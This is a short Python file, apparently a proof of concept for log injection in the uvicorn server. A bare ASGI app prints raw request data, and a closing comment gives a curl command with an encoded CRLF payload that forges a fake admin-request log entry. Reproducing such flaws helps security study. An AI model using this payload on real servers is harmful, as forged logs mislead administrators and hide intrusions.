import uvicorn

async def app(scope, receive, send):
    # Log the incoming request directly
    print(scope)  # This could include user-controlled input

    assert scope['type'] == 'http'
    await send({
        'type': 'http.response.start',
        'status': 200,
        'headers': [
            [b'Content-Type', b'text/plain']
        ]
    })
    await send({
        'type': 'http.response.body',
        'body': b'Hello, world!',
    })

if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=8000)

# Expoitation example:
#curl -v 'http://localhost:8000/logfile-injection%20HTTP%2f1.1%22%20200%20OK%0d%0aINFO:%20%20%20%20%208.8.8.8:1337%20-%20%22POST%20/admin/fake-action'